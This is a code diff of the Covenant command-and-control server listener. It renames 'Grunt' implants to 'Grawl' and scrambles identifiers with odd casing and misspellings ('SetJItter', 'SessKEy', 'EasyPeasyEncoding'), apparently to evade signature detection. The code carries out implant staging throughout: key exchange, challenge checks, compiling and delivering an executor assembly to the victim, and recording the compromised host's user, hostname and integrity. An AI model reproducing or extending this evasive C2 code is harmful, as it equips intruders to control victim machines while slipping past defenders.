+            ModelUtilities.GrawlTaskingMessageResponse taskResponse = JsonConvert.DeserializeObject<ModelUtilities.GrawlTaskingMessageResponse>(taskRawResponse);
+            APIModels.GrawlCommand command = await _client.GetGrawlCommandAsync(grawlTasking.GrawlCommandId ?? default);
             await _client.AppendCommandOutputAsync(command.CommandOutputId, taskResponse.Output);
 
-            gruntTasking.Status = taskResponse.Status;
-            if (gruntTasking.Status == APIModels.GruntTaskingStatus.Completed)
+            grawlTasking.Status = taskResponse.Status;
+            if (grawlTasking.Status == APIModels.GrawlTaskingStatus.Completed)
             {
-                gruntTasking.CompletionTime = DateTime.UtcNow;
+                grawlTasking.CompletionTime = DateTime.UtcNow;
             }
-            if (gruntTasking.Type == APIModels.GruntTaskingType.Connect)
+            if (grawlTasking.Type == APIModels.GrawlTaskingType.Connect)
             {
-                gruntTasking.Status = APIModels.GruntTaskingStatus.Progressed;
+                grawlTasking.Status = APIModels.GrawlTaskingStatus.Progressed;
             }
-            await _client.EditGruntTaskingAsync(gruntTasking);
+            await _client.EditGrawlTaskingAsync(grawlTasking);
             lock (_hashCodesLock)
             {
-                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(gruntTasking));
+                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(grawlTasking));
             }
-            if (gruntTasking.Type == APIModels.GruntTaskingType.SetDelay || gruntTasking.Type == APIModels.GruntTaskingType.SetJitter ||
-                gruntTasking.Type == APIModels.GruntTaskingType.SetConnectAttempts || gruntTasking.Type == APIModels.GruntTaskingType.SetKillDate ||
-                gruntTasking.Type == APIModels.GruntTaskingType.Exit)
+            if (grawlTasking.Type == APIModels.GrawlTaskingType.SetDelay || grawlTasking.Type == APIModels.GrawlTaskingType.SetJItter ||
+                grawlTasking.Type == APIModels.GrawlTaskingType.SetConneCTAttEmpts || grawlTasking.Type == APIModels.GrawlTaskingType.SetKillDate ||
+                grawlTasking.Type == APIModels.GrawlTaskingType.Exit)
             {
-                targetGrunt = await _client.GetGruntAsync(targetGrunt.Id ?? default);
+                targetGrawl = await _client.GetGrawlAsync(targetGrawl.Id ?? default);
             }
-            await CheckInGrunt(targetGrunt);
+            await CheckInGrawl(targetGrawl);
             return;
         }
 
-        private async Task PostStage0(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage0Response, string targetGuid, string guid)
+        private async Task PostStage0(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlFirstResponse, string targetGuid, string anotherid)
         {
-            if (targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
+            if (targetGrawl == null || !grawlFirstResponse.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlSharedSecretPassword)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
-            bool egressGruntExists = egressGrunt != null;
+            bool egressGrawlExists = egressGrawl != null;
 
-            if (targetGrunt.Status != APIModels.GruntStatus.Uninitialized)
+            if (targetGrawl.Status != APIModels.GrawlStatus.Uninitialized)
             {
-                // We create a new Grunt if this one is not uninitialized
-                APIModels.Grunt tempModel = new APIModels.Grunt
+                // We create a new Grawl if this one is not uninitialized
+                APIModels.Grawl tempModel = new APIModels.Grawl
                 {
                     Id = 0,
                     Name = Utilities.CreateShortGuid(),
                     Guid = targetGuid,
                     OriginalServerGuid = Utilities.CreateShortGuid(),
-                    Status = APIModels.GruntStatus.Stage0,
-                    ListenerId = targetGrunt.ListenerId,
-                    Listener = targetGrunt.Listener,
-                    ImplantTemplateId = targetGrunt.ImplantTemplateId,
-                    GruntSharedSecretPassword = targetGrunt.GruntSharedSecretPassword,
-                    SmbPipeName = targetGrunt.SmbPipeName,
-                    Delay = targetGrunt.Delay,
-                    JitterPercent = targetGrunt.JitterPercent,
-                    KillDate = targetGrunt.KillDate,
-                    ConnectAttempts = targetGrunt.ConnectAttempts,
-                    DotNetVersion = targetGrunt.DotNetVersion,
-                    RuntimeIdentifier = targetGrunt.RuntimeIdentifier,
+                    Status = APIModels.GrawlStatus.Stage0,
+                    ListenerId = targetGrawl.ListenerId,
+                    Listener = targetGrawl.Listener,
+                    ImplantTemplateId = targetGrawl.ImplantTemplateId,
+                    GrawlSharedSecretPassword = targetGrawl.GrawlSharedSecretPassword,
+                    SmbPipeName = targetGrawl.SmbPipeName,
+                    Delay = targetGrawl.Delay,
+                    JItterPercent = targetGrawl.JItterPercent,
+                    KillDate = targetGrawl.KillDate,
+                    ConneCTAttEmpts = targetGrawl.ConneCTAttEmpts,
+                    DotNetVersion = targetGrawl.DotNetVersion,
+                    RuntimeIdentifier = targetGrawl.RuntimeIdentifier,
                     LastCheckIn = DateTime.UtcNow
                 };
-                targetGrunt = await _client.CreateGruntAsync(tempModel);
+                targetGrawl = await _client.CreateGrawlAsync(tempModel);
             }
             else
             {
-                targetGrunt.Status = APIModels.GruntStatus.Stage0;
-                targetGrunt.Guid = targetGuid;
-                targetGrunt.LastCheckIn = DateTime.UtcNow;
-                targetGrunt = await _client.EditGruntAsync(targetGrunt);
+                targetGrawl.Status = APIModels.GrawlStatus.Stage0;
+                targetGrawl.Guid = targetGuid;
+                targetGrawl.LastCheckIn = DateTime.UtcNow;
+                targetGrawl = await _client.EditGrawlAsync(targetGrawl);
             }
-            if (!egressGruntExists)
+            if (!egressGrawlExists)
             {
-                egressGrunt = targetGrunt;
+                egressGrawl = targetGrawl;
             }
 
-            // EncryptedMessage is the RSA Public Key
-            targetGrunt.GruntRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
-                gruntStage0Response,
-                Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)
+            // EncMsg is the RSA Public Key
+            targetGrawl.GrawlRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
+                grawlFirstResponse,
+                Convert.FromBase64String(targetGrawl.GrawlSharedSecretPassword)
             ));
             // Generate negotiated session key
             using (Aes newAesKey = Aes.Create())
             {
                 newAesKey.GenerateKey();
-                targetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
-                await _client.EditGruntAsync(targetGrunt);
+                targetGrawl.GrawlNegotiatedSessKEy = Convert.ToBase64String(newAesKey.Key);
+                await _client.EditGrawlAsync(targetGrawl);
             }
 
-            if (egressGruntExists)
+            if (egressGrawlExists)
             {
-                // Add this as Child grunt to Grunt that connects it
-                List<APIModels.GruntTasking> taskings = _client.GetAllGruntTaskings().ToList();
-                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
-                APIModels.GruntTasking connectTasking = taskings
-                    .Where(GT => GT.Type == APIModels.GruntTaskingType.Connect && (GT.Status == APIModels.GruntTaskingStatus.Progressed || GT.Status == APIModels.GruntTaskingStatus.Tasked))
+                // Add this as Child grawl to Grawl that connects it
+                List<APIModels.GrawlTasking> taskings = _client.GetAllGrawlTaskings().ToList();
+                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ anotherid of some sort?
+                APIModels.GrawlTasking connectTasking = taskings
+                    .Where(GT => GT.Type == APIModels.GrawlTaskingType.Connect && (GT.Status == APIModels.GrawlTaskingStatus.Progressed || GT.Status == APIModels.GrawlTaskingStatus.Tasked))
                     .Reverse()
                     .FirstOrDefault();
                 if (connectTasking == null)
                 {
-                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                    this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                     return;
                 }
-                ModelUtilities.GruntTaskingMessage tmessage = this.GetGruntTaskingMessage(connectTasking, targetGrunt.DotNetVersion);
-                targetGrunt.Hostname = tmessage.Message.Split(",")[0];
-                await _client.EditGruntAsync(targetGrunt);
-                connectTasking.Status = APIModels.GruntTaskingStatus.Completed;
-                connectTasking.Parameters.Add(targetGrunt.Guid);
-                await _client.EditGruntTaskingAsync(connectTasking);
-                targetGrunt = await _client.GetGruntAsync(targetGrunt.Id ?? default);
+                ModelUtilities.GrawlTaskingMessage tmessage = this.GetGrawlTaskingMessage(connectTasking, targetGrawl.DotNetVersion);
+                targetGrawl.Hostname = tmessage.Message.Split(",")[0];
+                await _client.EditGrawlAsync(targetGrawl);
+                connectTasking.Status = APIModels.GrawlTaskingStatus.Completed;
+                connectTasking.Parameters.Add(targetGrawl.Guid);
+                await _client.EditGrawlTaskingAsync(connectTasking);
+                targetGrawl = await _client.GetGrawlAsync(targetGrawl.Id ?? default);
             }
 
-            byte[] rsaEncryptedBytes = EncryptUtilities.GruntRSAEncrypt(targetGrunt, Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey));
-            ModelUtilities.GruntEncryptedMessage message = null;
+            byte[] rsaEncryptedBytes = EncryptUtilities.GrawlRSAEncrypt(targetGrawl, Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy));
+            ModelUtilities.GrawlEncMsg message = null;
             try
             {
-                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, rsaEncryptedBytes);
+                message = this.CreateMessageForGrawl(egressGrawl, targetGrawl, rsaEncryptedBytes);
             }
             catch (HttpOperationException)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
             // Transform response
-            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            // FirstResponse: "Id,Name,Base64(IV),Base64(AES(RSA(SessKEy))),Base64(HMAC)"
+            string transformed = this._utilities.ProfileTransform(_transform, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
-        private async Task PostStage1(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage1Response, string guid)
+        private async Task PostStage1(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlSeccondResponse, string anotherid)
         {
-            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage0 || !gruntStage1Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (targetGrawl == null || targetGrawl.Status != APIModels.GrawlStatus.Stage0 || !grawlSeccondResponse.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (egressGrunt == null)
+            if (egressGrawl == null)
             {
-                egressGrunt = targetGrunt;
+                egressGrawl = targetGrawl;
             }
-            byte[] challenge1 = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage1Response);
+            byte[] challenge1 = _utilities.GrawlSessionDecrypt(targetGrawl, grawlSeccondResponse);
             byte[] challenge2 = new byte[4];
             using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
             {
                 rng.GetBytes(challenge2);
             }
             // Save challenge to compare on response
-            targetGrunt.GruntChallenge = Convert.ToBase64String(challenge2);
-            targetGrunt.Status = APIModels.GruntStatus.Stage1;
-            targetGrunt.LastCheckIn = DateTime.UtcNow;
-            await _client.EditGruntAsync(targetGrunt);
+            targetGrawl.GrawlChallenge = Convert.ToBase64String(challenge2);
+            targetGrawl.Status = APIModels.GrawlStatus.Stage1;
+            targetGrawl.LastCheckIn = DateTime.UtcNow;
+            await _client.EditGrawlAsync(targetGrawl);
 
-            ModelUtilities.GruntEncryptedMessage message;
+            ModelUtilities.GrawlEncMsg message;
             try
             {
-                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray());
+                message = this.CreateMessageForGrawl(egressGrawl, targetGrawl, challenge1.Concat(challenge2).ToArray());
             }
             catch (HttpOperationException)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
             // Transform response
-            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            // SeccondResponse: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
+            string transformed = this._utilities.ProfileTransform(_transform, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
-        private async Task PostStage2(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage2Response, string guid)
+        private async Task PostStage2(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlThirdResponse, string anotherid)
         {
-            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage1 || !gruntStage2Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (targetGrawl == null || targetGrawl.Status != APIModels.GrawlStatus.Stage1 || !grawlThirdResponse.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (egressGrunt == null)
+            if (egressGrawl == null)
             {
-                egressGrunt = targetGrunt;
+                egressGrawl = targetGrawl;
             }
-            byte[] challenge2test = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage2Response);
-            if (targetGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
+            byte[] challenge2test = _utilities.GrawlSessionDecrypt(targetGrawl, grawlThirdResponse);
+            if (targetGrawl.GrawlChallenge != Convert.ToBase64String(challenge2test))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            targetGrunt.Status = APIModels.GruntStatus.Stage2;
-            targetGrunt.LastCheckIn = DateTime.UtcNow;
-            await _client.EditGruntAsync(targetGrunt);
-            byte[] GruntExecutorAssembly = await this._client.CompileGruntExecutorAsync(targetGrunt.Id ?? default);
+            targetGrawl.Status = APIModels.GrawlStatus.Stage2;
+            targetGrawl.LastCheckIn = DateTime.UtcNow;
+            await _client.EditGrawlAsync(targetGrawl);
+            byte[] GrawlExecutorAssembly = await this._client.CompileGrawlExecutorAsync(targetGrawl.Id ?? default);
 
-            ModelUtilities.GruntEncryptedMessage message;
+            ModelUtilities.GrawlEncMsg message;
             try
             {
-                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, GruntExecutorAssembly);
+                message = this.CreateMessageForGrawl(egressGrawl, targetGrawl, GrawlExecutorAssembly);
             }
             catch (HttpOperationException)
             {
-                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject("")));
+                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject("")));
                 throw new ControllerNotFoundException(emptyTransformed);
             }
 
             // Transform response
-            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            // returns: "Base64(IV),Base64(AES(GrawlExecutorAssembly)),Base64(HMAC)"
+            string transformed = this._utilities.ProfileTransform(_transform, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
-        private async Task RegisterGrunt(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntMessage, string guid)
+        private async Task RegisterGrawl(APIModels.Grawl egressGrawl, APIModels.Grawl targetGrawl, ModelUtilities.GrawlEncMsg grawlMessage, string anotherid)
         {
-            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage2 || !gruntMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (targetGrawl == null || targetGrawl.Status != APIModels.GrawlStatus.Stage2 || !grawlMessage.VerifyHMAC(Convert.FromBase64String(targetGrawl.GrawlNegotiatedSessKEy)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (egressGrunt == null)
+            if (egressGrawl == null)
             {
-                egressGrunt = targetGrunt;
+                egressGrawl = targetGrawl;
             }
-            string message = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, gruntMessage));
+            string message = Common.EasyPeasyEncoding.GetString(_utilities.GrawlSessionDecrypt(targetGrawl, grawlMessage));
             // todo: try/catch on deserialize?
-            APIModels.Grunt grunt = JsonConvert.DeserializeObject<APIModels.Grunt>(message);
-            targetGrunt.IpAddress = grunt.IpAddress;
-            targetGrunt.Hostname = grunt.Hostname;
-            targetGrunt.OperatingSystem = grunt.OperatingSystem;
-            targetGrunt.UserDomainName = grunt.UserDomainName;
-            targetGrunt.UserName = grunt.UserName;
-            targetGrunt.Status = APIModels.GruntStatus.Active;
-            targetGrunt.Integrity = grunt.Integrity;
-            targetGrunt.Process = grunt.Process;
-            targetGrunt.LastCheckIn = DateTime.UtcNow;
+            APIModels.Grawl grawl = JsonConvert.DeserializeObject<APIModels.Grawl>(message);
+            targetGrawl.IpAddress = grawl.IpAddress;
+            targetGrawl.Hostname = grawl.Hostname;
+            targetGrawl.OperatingSystem = grawl.OperatingSystem;
+            targetGrawl.UserDomainName = grawl.UserDomainName;
+            targetGrawl.UserName = grawl.UserName;
+            targetGrawl.Status = APIModels.GrawlStatus.Active;
+            targetGrawl.Integrity = grawl.Integrity;
+            targetGrawl.Process = grawl.Process;
+            targetGrawl.LastCheckIn = DateTime.UtcNow;
 
-            await _client.EditGruntAsync(targetGrunt);
+            await _client.EditGrawlAsync(targetGrawl);
 
-            ModelUtilities.GruntTaskingMessage tasking = new ModelUtilities.GruntTaskingMessage
+            ModelUtilities.GrawlTaskingMessage tasking = new ModelUtilities.GrawlTaskingMessage
             {
-                Message = targetGrunt.Guid,
+                Message = targetGrawl.Guid,
                 Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
-                Type = APIModels.GruntTaskingType.Tasks,
+                Type = APIModels.GrawlTaskingType.Tasks,
                 Token = false
             };
 
-            ModelUtilities.GruntEncryptedMessage responseMessage;
+            ModelUtilities.GrawlEncMsg responseMessage;
             try
             {
-                responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, tasking);
+                responseMessage = this.CreateMessageForGrawl(egressGrawl, targetGrawl, tasking);
             }
             catch (HttpOperationException)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
             // Transform response
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            string transformed = this._utilities.ProfileTransform(_transform, Common.EasyPeasyEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
+            this.PushCache(anotherid, new GrawlMessageCacheInfo { Status = GrawlMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
@@ -822,37 +822,37 @@ namespace Covenant.Models.Listeners
             // Returns IV (16 bytes) + EncryptedData byte array
             public static byte[] AesEncrypt(byte[] data, byte[] key)
             {
-                using (Aes SessionKey = Aes.Create())
+                using (Aes SessKEy = Aes.Create())
                 {
-                    SessionKey.Mode = Common.AesCipherMode;
-                    SessionKey.Padding = Common.AesPaddingMode;
-                    SessionKey.GenerateIV();
-                    SessionKey.Key = key;
+                    SessKEy.Mode = Common.AesCipherMode;
+                    SessKEy.Padding = Common.AesPaddingMode;
+                    SessKEy.GenerateIV();
+                    SessKEy.Key = key;
 
-                    byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
+                    byte[] encrypted = SessKEy.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
 
-                    return SessionKey.IV.Concat(encrypted).ToArray();
+                    return SessKEy.IV.Concat(encrypted).ToArray();
                 }
             }
 
             // Data should be of format: IV (16 bytes) + EncryptedBytes
             public static byte[] AesDecrypt(byte[] data, byte[] key)
             {
-                using (Aes SessionKey = Aes.Create())
+                using (Aes SessKEy = Aes.Create())
                 {
-                    SessionKey.IV = data.Take(Common.AesIVLength).ToArray();
-                    SessionKey.Key = key;
+                    SessKEy.IV = data.Take(Common.AesIVLength).ToArray();
+                    SessKEy.Key = key;
 
                     byte[] encryptedData = data.TakeLast(data.Length - Common.AesIVLength).ToArray();
-                    return SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
+                    return SessKEy.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                 }
             }
 
-            // Convenience method for decrypting an EncryptedMessagePacket
-            public static byte[] AesDecrypt(ModelUtilities.GruntEncryptedMessage encryptedMessage, byte[] key)
+            // Convenience method for decrypting an EncMsgPacket
+            public static byte[] AesDecrypt(ModelUtilities.GrawlEncMsg encryptedMessage, byte[] key)
             {
                 return AesDecrypt(
-                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncryptedMessage)).ToArray(),
+                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncMsg)).ToArray(),
                     key
                 );
             }
@@ -885,9 +885,9 @@ namespace Covenant.Models.Listeners
                 }
             }
 
-            public static byte[] GruntRSAEncrypt(APIModels.Grunt grunt, byte[] toEncrypt)
+            public static byte[] GrawlRSAEncrypt(APIModels.Grawl grawl, byte[] toEncrypt)
             {
-                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.CovenantEncoding.GetString(Convert.FromBase64String(grunt.GruntRSAPublicKey)));
+                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.EasyPeasyEncoding.GetString(Convert.FromBase64String(grawl.GrawlRSAPublicKey)));
             }
         }
 
@@ -907,13 +907,13 @@ namespace Covenant.Models.Listeners
                 return (byte[])t.GetMethod("Invert").Invoke(null, new object[] { str });
             }
 
-            public partial class GruntTaskingMessage
+            public partial class GrawlTaskingMessage
             {
-                public GruntTaskingMessage()
+                public GrawlTaskingMessage()
                 {
                     CustomInit();
                 }
-                public GruntTaskingMessage(APIModels.GruntTaskingType? type = default(APIModels.GruntTaskingType?), string name = default(string), string message = default(string), bool? token = default(bool?))
+                public GrawlTaskingMessage(APIModels.GrawlTaskingType? type = default(APIModels.GrawlTaskingType?), string name = default(string), string message = default(string), bool? token = default(bool?))
                 {
                     Type = type;
                     Name = name;
@@ -923,7 +923,7 @@ namespace Covenant.Models.Listeners
                 }
                 partial void CustomInit();
                 [JsonProperty(PropertyName = "type")]
-                public APIModels.GruntTaskingType? Type { get; set; }
+                public APIModels.GrawlTaskingType? Type { get; set; }
                 [JsonProperty(PropertyName = "name")]
                 public string Name { get; set; }
                 [JsonProperty(PropertyName = "message")]
@@ -932,13 +932,13 @@ namespace Covenant.Models.Listeners
                 public bool? Token { get; set; }
             }
 
-            public partial class GruntTaskingMessageResponse
+            public partial class GrawlTaskingMessageResponse
             {
-                public GruntTaskingMessageResponse()
+                public GrawlTaskingMessageResponse()
                 {
                     CustomInit();
                 }
-                public GruntTaskingMessageResponse(APIModels.GruntTaskingStatus? status = default(APIModels.GruntTaskingStatus?), string output = default(string))
+                public GrawlTaskingMessageResponse(APIModels.GrawlTaskingStatus? status = default(APIModels.GrawlTaskingStatus?), string output = default(string))
                 {
                     Status = status;
                     Output = output;
@@ -946,58 +946,58 @@ namespace Covenant.Models.Listeners
                 }
                 partial void CustomInit();
                 [JsonProperty(PropertyName = "status")]
-                public APIModels.GruntTaskingStatus? Status { get; set; }
+                public APIModels.GrawlTaskingStatus? Status { get; set; }
                 [JsonProperty(PropertyName = "output")]
                 public string Output { get; set; }
             }
 
-            public enum GruntEncryptedMessageType
+            public enum GrawlEncMsgType
             {
                 Routing,
                 Tasking
             }
 
-            public class GruntEncryptedMessage
+            public class GrawlEncMsg
             {
-                public string GUID { get; set; }
-                public GruntEncryptedMessageType Type { get; set; }
+                public string ANOTHERID { get; set; }
+                public GrawlEncMsgType Type { get; set; }
                 public string Meta { get; set; } = "";
 
                 public string IV { get; set; }
-                public string EncryptedMessage { get; set; }
+                public string EncMsg { get; set; }
                 public string HMAC { get; set; }
 
-                private static GruntEncryptedMessage Create(string GUID, byte[] message, byte[] key, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
+                private static GrawlEncMsg Create(string ANOTHERID, byte[] message, byte[] key, GrawlEncMsgType Type = GrawlEncMsgType.Tasking)
                 {
                     byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
                     byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
                     byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
                     byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
-                    return new GruntEncryptedMessage
+                    return new GrawlEncMsg
                     {
-                        GUID = GUID,
+                        ANOTHERID = ANOTHERID,
                         Type = Type,
-                        EncryptedMessage = Convert.ToBase64String(encryptedMessage),
+                        EncMsg = Convert.ToBase64String(encryptedMessage),
                         IV = Convert.ToBase64String(encryptionIV),
                         HMAC = Convert.ToBase64String(hmac)
                     };
                 }
 
-                public static GruntEncryptedMessage Create(APIModels.Grunt grunt, byte[] message, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
+                public static GrawlEncMsg Create(APIModels.Grawl grawl, byte[] message, GrawlEncMsgType Type = GrawlEncMsgType.Tasking)
                 {
-                    if (grunt.Status == APIModels.GruntStatus.Uninitialized || grunt.Status == APIModels.GruntStatus.Stage0)
+                    if (grawl.Status == APIModels.GrawlStatus.Uninitialized || grawl.Status == APIModels.GrawlStatus.Stage0)
                     {
-                        return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntSharedSecretPassword), Type);
+                        return Create(grawl.Guid, message, Convert.FromBase64String(grawl.GrawlSharedSecretPassword), Type);
                     }
-                    return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey), Type);
+                    return Create(grawl.Guid, message, Convert.FromBase64String(grawl.GrawlNegotiatedSessKEy), Type);
                 }
 
                 public bool VerifyHMAC(byte[] Key)
                 {
-                    if (IV == "" || EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
+                    if (IV == "" || EncMsg == "" || HMAC == "" || Key.Length == 0) { return false; }
                     try
                     {
-                        var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
+                        var hashedBytes = Convert.FromBase64String(this.EncMsg);
                         return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
                     }
                     catch
@@ -1008,16 +1008,16 @@ namespace Covenant.Models.Listeners
             }
 
             // Data should be of format: IV (16 bytes) + EncryptedBytes
-            public byte[] GruntSessionDecrypt(APIModels.Grunt grunt, byte[] data)
+            public byte[] GrawlSessionDecrypt(APIModels.Grawl grawl, byte[] data)
             {
-                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey));
